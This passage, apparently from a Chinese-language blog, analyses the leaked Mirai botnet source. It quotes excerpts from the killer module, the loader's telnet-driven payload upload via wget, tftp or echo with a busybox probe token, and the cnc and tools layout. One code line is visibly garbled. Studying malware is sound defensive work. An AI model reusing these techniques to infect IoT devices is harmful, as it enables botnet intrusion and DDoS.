        }
        ......
另外两处kill掉23端口和80端口的代码与此类似，在killer_kill_by_port函数中实现了通过端口来查找进程的功能，其中：
    /proc/net/tcp     记录了所有tcp连接的情况
    /proc/pid/exe     包含了正在进程中运行的程序链接
    /proc/pid/fd      包含了进程打开的每一个文件的链接
    /proc/pid/status  包含了进程的状态信息
此外，程序将通过readdir函数遍历/proc下的进程文件夹来查找特定文件，而readlink函数可以获取进程所对应程序的真实路径，这里会查找与之同类的恶意程序anime，如果找到就删除文件并kill掉进程：
    // If path contains ".anime" kill.
    if (util_stristr(realpath, rp_len - 1, table_retrieve_val(TABLE_KILLER_ANIME, NULL)) != -1)
    {
        unlink(realpath);
        kill(pid, 9);
    }
同时，如果/proc/$pid/exe文件匹配了下述字段，对应进程也要被kill掉：
    REPORT %s:%s
    HTTPFLOOD
    LOLNOGTFO
    \x58\x4D\x4E\x4E\x43\x50\x46\x22
    zollard
### 2.2 loader分析
这部分代码的功能就是向感染设备上传（wget、tftp、echo方式）对应架构的payload文件，loader/src的目录结构如下：
    headers/       头文件目录
    binary.c       将bins目录下的文件读取到内存中，以echo方式上传payload文件时用到
    connection.c   判断loader和感染设备telnet交互过程中的状态信息
    main.c         loader主函数
    server.c       向感染设备发起telnet交互，上传payload文件
    telnet_info.c  解析约定格式的telnet信息
    util.c         一些常用的公共函数
从功能逻辑上看，还需要mirai/tools/scanListen.go的配合来监听上报的telnet信息，因为main函数中只能从stdin读取对应信息：
    // Read from stdin
    while (TRUE)
    {
        char strbuf[1024];
        if (fgets(strbuf, sizeof (strbuf), stdin) == NULL)
            break;
        ......
        memset(&info, 0, sizeof(struct telnet_info));
        //解析telnet信息
        if (telnet_info_parse(strbuf, &info) == NULL)
接下来我们对这块内容进行详细的分析，同样先看下那些公共函数，也就是util.c文件，如下：
    /******util.c******/
    //输出地址addr处开始的len个字节的内存数据
    void hexDump (char *desc, void *addr, int len);
    //bind可用地址并设置socket为非阻塞模式
    int util_socket_and_bind(struct server *srv);
    //查找字节序列中是否存在特定的子字节序列
    int util_memsearch(char *buf, int buf_len, char *mem, int mem_len);
    //发送socket数据包
    BOOL util_sockprintf(int fd, const char *fmt, ...);
    //去掉字符串首尾的空格字符
    char *util_trim(char *str);
其中用的最经常的是util_sockprintf函数，简单理解就是send发包，但每次的参数个数是可变的。
继续，虽然loader的主要功能在server.c中，但分析它之前我们需要看下余
下的3个c文件，因为很多调用的功能是在其中实现的，首先是binary.c文件中的函数：
    /******binary.c******/
    //bin_list初始化，读取所有bins/dlr.*文件
    BOOL binary_init(void)
    {
        ......
        //匹配所有bins/dlr.*文件，结果存放pglob
        if (glob("bins/dlr.*", GLOB_ERR, NULL, &pglob) != 0)
        ......
    }
    //按照不同体系架构获取相应的二进制文件
    struct binary *binary_get_by_arch(char *arch);
    //将指定的二进制文件读取到内存中
    static BOOL load(struct binary *bin, char *fname);
即将编译好的不同体系架构的二进制文件读取到内存中，当loader和感染设备建立telnet连接后，如果不得不通过echo命令来上传payload，那么这些数据就会用到了。
接着来看telnet_info.c文件中的函数，如下：
    /******telnet_info.c******/
    //初始化telnet_info结构的变量
    struct telnet_info *telnet_info_new(char *user, char *pass, char *arch, 
        ipv4_t addr, port_t port, struct telnet_info *info);
    //解析节点的telnet信息，提取相关参数
    struct telnet_info *telnet_info_parse(char *str, struct telnet_info *out);
即解析telnet信息格式并存到telnet_info结构体中，通过获取这些信息就可以和受害者设备建立telnet连接了。
然后是connection.c文件中的函数，主要用来判断telnet交互中的状态信息，如下，只列出部分：
    /******connection.c******/
    //判断telnet连接是否顺利建立，若成功则发送回包
    int connection_consume_iacs(struct connection *conn);
    //判断是否收到login提示信息
    int connection_consume_login_prompt(struct connection *conn);
    //判断是否收到password提示信息
    int connection_consume_password_prompt(struct connection *conn);
    //根据ps命令返回结果kill掉某些特殊进程
    int connection_consume_psoutput(struct connection *conn);
    //判断系统的体系架构，即解析ELF文件头
    int connection_consume_arch(struct connection *conn);
    //判断采用哪种方式上传payload（wget、tftp、echo）
    int connection_consume_upload_methods(struct connection *conn);
    //判断drop的payload是否成功运行
    int connection_verify_payload(struct connection *conn);
    //对应的telnet连接状态为枚举类型
    enum {
        TELNET_CLOSED,          // 0
        TELNET_CONNECTING,      // 1
        TELNET_READ_IACS,       // 2
        TELNET_USER_PROMPT,     // 3
        TELNET_PASS_PROMPT,     // 4
        ......
        TELNET_RUN_BINARY,      // 18
        TELNET_CLEANUP          // 19
    } state_telnet;
这里要提一下程序在发包时用到的一个技巧，比如下面的代码：
    util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
    //用在其它命令后作为一种标记，可判断之前的命令是否执行
    #define TOKEN_QUERY     "/bin/busybox ECCHI"
    //如果回包中有如下提示，则之前的命令执行了  
    #define TOKEN_RESPONSE  "ECCHI: applet not found"
好了，至此我们已经知道如何将不同架构的二进制文件读到内存中、如何获取待感染设备的telnet信息以及如何判断telnet交互过程中的状态信息，那么下面就可以开始server.c文件的分析了，这里列出几个主要函数：
    /******server.c******/
    //判断能否处理新的感染节点
    void server_queue_telnet(struct server *srv, struct telnet_info *info);
    //处理新的感染节点
    void server_telnet_probe(struct server *srv, struct telnet_info *info);
    //事件处理线程
    static void *worker(void *arg)
    {
        struct server_worker *wrker = (struct server_worker *)arg;
        struct epoll_event events[128];
        bind_core(wrker->thread_id);
        while (TRUE)
        {
            //等待事件的产生
            int i, n = epoll_wait(wrker->efd, events, 127, -1);
            if (n == -1)
                perror("epoll_wait");
            for (i = 0; i fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
    //在返回包中进行判断
    if (util_memsearch(conn->rdbuf, offset, "wget: applet not found", 22) == -1)
            conn->info.upload_method = UPLOAD_WGET;
        else if (util_memsearch(conn->rdbuf, offset, "tftp: applet not found", 22) == -1)
            conn->info.upload_method = UPLOAD_TFTP;
        else
            conn->info.upload_method = UPLOAD_ECHO;
oader同时支持wget、tftp、echo的方式来上传payload，其中wget和tftp服务器的相关信息在创建server时需要给出：
    struct server *server_create(uint8_t threads, uint8_t addr_len, ipv4_t *addrs, uint32_t max_open, 
       char *wghip, port_t wghp, char *thip); //wget服务器的ip和port，tftp服务器的ip
6）执行payload并清理。 通过上述这几个简单的步骤，loader就能成功实现对受害者节点的感染了。
### 2.3 cnc与tools简单分析
cnc目录主要提供用户管理的接口、处理攻击请求并下发攻击命令：
    admin.go      处理管理员登录、创建新用户以及初始化攻击
    api.go        向感染的bot节点发送命令
    attack.go     处理用户的攻击请求
    clientList.go 管理感染的bot节点
    database.go   数据库管理，包括用户登录验证、新建用户、处理白名单、验证用户的攻击请求
    main.go       程序入口，开启23端口和101端口的监听
而tools目录主要提供了一些工具，相应的功能如下：
    enc.c         对数据进行异或加密处理
    nogdb.c       通过修改elf文件头实现反gdb调试
    scanListen.go 监听payload（bot）扫描后上报的telnet信息，并将结果交由loader处理
    single_load.c 另一个loader实现
    wget.c        实现了wget文件下载
## 3\. 后记
总体来看Mirai源码代码量不大而且编码风格比较清晰，理解起来并不难。但是有些地方逻辑上还存在瑕疵，例如：
    //***loader/src/util.c*** 查找字节序列中是否存在特定的子字节序列
    //逻辑不对，util_memsearch("aabc", 4, "abc", 3)就不满足
    int util_memsearch(char *buf, int buf_len, char *mem, int mem_len);
但作为IoT下的恶意程序源码还是很值得参考的，特别是随着最近新变种的出现。可想而知变种会加入更多的反调试手段来阻碍分析，而且交互的数据包会更多的采用加密处理，这点还是很容易的，比如在原先异或的基础上加个查表操作，同时对于不同漏洞的利用也会更加的模块化。正因如此，研究其最初的源码是十分有必要的。
## 4\. 参考链接
  * https://github.com/jgamblin/Mirai-Source-Code
  * https://www.incapsula.com/blog/malware-analysis-mirai-ddos-botnet.html
  * https://medium.com/@cjbarker/mirai-ddos-source-code-review-57269c4a68f#.3w191m1y0
* * *